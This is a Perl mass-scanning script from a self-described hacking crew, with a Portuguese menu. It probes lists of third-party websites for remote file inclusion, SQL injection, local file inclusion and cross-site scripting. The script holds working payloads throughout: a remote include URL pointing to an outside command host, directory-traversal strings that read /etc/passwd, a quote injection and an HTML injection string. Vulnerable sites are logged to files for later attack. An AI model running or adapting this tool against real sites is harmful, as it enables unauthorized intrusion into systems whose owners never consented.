#!/usr/bin/perl
use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;

inicio:
$sis="$^O";if ($sis eq linux){ $cmd="clear";} else { $cmd="cls"; }
system("$cmd");

print "###########################################################\n";
print "#                     [Collaps3 CREW]                     #\n";
print "#    Contato: irc.Got2Think.org /j #Collaps3 + #c0d3rs    #\n";
print "#    MULTIPLE SCAN - Scanner Para RFI, SQL, LFI e XSS.    #\n";
print "#         c0d3d by DD3str0y3r, Ed1t3d by CyraxzZ.         #\n";
print "#                 :::Brazilians c0d3rs:::                 #\n";
print "# Gr33tz: Dr4k3, _Mlk_, Z4i0n, datalock, M0nt3r, G3N3SIS. #\n";
print "###########################################################\n\n";

print "Menu:\n\n";
print "1. Testar Lista em RFI\n";
print "2. Testar Lista em SQL\n";
print "3. Testar Lista em LFI\n";
print "4. Testar Lista em XSS\n\n";
print "Opcao: ";
my $opcao=<STDIN>;
if ($opcao==1){&RFI}
if ($opcao==2){&SQL}
if ($opcao==3){&LFI}
if ($opcao==4){&XSS}

#######
# RFI #
#######

sub RFI {

print "\n#######\n";
print "# RFI #\n";
print "#######\n";
print "\nDigite o nome da lista de sites:\n";
print "Ex: Sites.txt, Lista.txt etc...\n\n";
print "Os sites dentro da lista deve estar da seguinte forma:\n";
print "http://www.site.com.br/index.php?pg=\n\n";
chomp($lista = <STDIN>);

system("$cmd");

print "->Pesquisando RFI... Aguarde...\n\n";

open(LISTA, "$lista");
while(<LISTA>) {

my $lista = $_;
chomp $lista;

my $rfi= "http://dd3str0y3r.webs.com/cmd?";

my $url=$lista.$rfi;

my $req=HTTP::Request->new(GET=>$url);
my $ua=LWP::UserAgent->new();
$ua->timeout(15);
my $resposta=$ua->request($req);

if($resposta->content =~ /D3str0y/){
print "[+] Encontrado -> $url\n";
open(a, ">>LISTA_RFI.txt.txt");
print a "$url\n";
close(a);
  }else{ print "[-] Nao Encontrado <- $url\n"; }
}
print "\nCaso houver resultados eles serao salvos em LISTA_RFI.txt\n";
print "\nAperte ENTER para voltar ao menu principal...\n";
<STDIN>;
goto inicio;
}

#######
# SQL #
#######

sub SQL {

print "\n#######\n";
print "# SQL #\n";
print "#######\n";
print "\nDigite o nome da lista de sites:\n";
print "Ex: Sites.txt, Lista.txt etc...\n\n";
print "Os sites dentro da lista deve estar da seguinte forma:\n";
print "http://www.site.com.br/noticias.php?id=99\n";
print "Ou:\n";
print "http://www.site.com.br/noticias.asp?id=99\n\n";
chomp($lista = <STDIN>);

system("$cmd");

print "->Pesquisando SQL... Aguarde...\n\n";

open(LISTA, "$lista");
while(<LISTA>) {

my $lista = $_;
chomp $lista;

my $sql="'";

my $url=$lista.$sql;

my $req=HTTP::Request->new(GET=>$url);
my $ua=LWP::UserAgent->new();
$ua->timeout(15);
my $resposta=$ua->request($req);

if($resposta->content =~ /You have an error in your SQL syntax/ ||
$resposta->content =~ /MySQL server version/ ||
$resposta->content =~ /Syntax error converting the nvarchar value/ ||
$resposta->content =~ /Unclosed quotation mark before/ ||
$resposta->content =~ /SQL Server error/ ||
$resposta->content =~ /JET/){
print "[+] Encontrado -> $url\n";
open(a, ">>LISTA_SQL.txt");
print a "$url\n";
close(a);
}else{
print "[-] Nao Encontrado <- $url\n";
}}
print "\nCaso houver resultados eles serao salvos em LISTA_SQL.txt\n";
print "\nAperte ENTER para voltar ao menu principal...\n";
<STDIN>;
goto inicio;
}

#######
# LFI #
#######

sub LFI {

print "\n#######\n";
print "# LFI #\n";
print "#######\n";
print "\nDigite o nome da lista de sites:\n";
print "Ex: Sites.txt, Lista.txt etc...\n\n";
print "Os sites dentro da lista deve estar da seguinte forma:\n";
print "http://www.site.com.br/index.php?pg=\n\n";
chomp($lista = <STDIN>);

system("$cmd");

print "->Pesquisando LFI... Aguarde...\n\n";

open(LISTA, "$lista");
while(<LISTA>) {

my $lista = $_;
chomp $lista;

@lfi= ('/etc/passwd',
       '/etc/passwd%00',
       '../../../../../../../../../../../../../../../etc/passwd',
       '../../../../../../../../../../../../../../../etc/passwd%00');

foreach $bug(@lfi){

my $url=$lista.$bug;

my $req=HTTP::Request->new(GET=>$url);
my $ua=LWP::UserAgent->new();
$ua->timeout(15);
my $response=$ua->request($req);

if($response->content =~ /root:x:/ ||
$response->content =~ /root:*:/ ||
$response->content =~ /root:!:/){
print "[+] Encontrado -> $url\n";
open(a, ">>LISTA_LFI.txt");
print a "$url\n";
close(a);
}else{
print "[-] Nao Encontrado <- $url\n";}
  }
}
print "\nCaso houver resultados eles serao salvos em LISTA_LFI.txt\n";
print "\nAperte ENTER para voltar ao menu principal...\n";
<STDIN>;
goto inicio;
}

#######
# XSS #
#######

sub XSS {

print "\n#######\n";
print "# XSS #\n";
print "#######\n";
print "\nDigite o nome da lista de sites:\n";
print "Ex: Sites.txt, Lista.txt etc...\n\n";
print "Os sites dentro da lista deve estar da seguinte forma:\n";
print "http://www.site.com.br/index.php?pg=\n\n";
chomp($lista = <STDIN>);

system("$cmd");

print "->Pesquisando XSS... Aguarde...\n\n";

open(LISTA, "$lista");
while(<LISTA>) {

my $lista = $_;
chomp $lista;

my $xss= ('s[1]"><h1>XSS<?');

my $url=$lista.$xss;

my $req=HTTP::Request->new(GET=>$url);
my $ua=LWP::UserAgent->new();
$ua->timeout(15);
my $response=$ua->request($req);

if($response->content =~ /XSS/){
print "[+] Encontrado -> $url\n";
open(a, ">>LISTA_XSS.txt");
print a "$url\n";
close(a);
}else{
print "[-] Nao Encontrado <- $url\n"; }
}
print "\nCaso houver resultados eles serao salvos em LISTA_XSS.txt\n";
print "\nAperte ENTER para voltar ao menu principal...\n";
<STDIN>;
goto inicio;
}

#27/12/2008
#EOF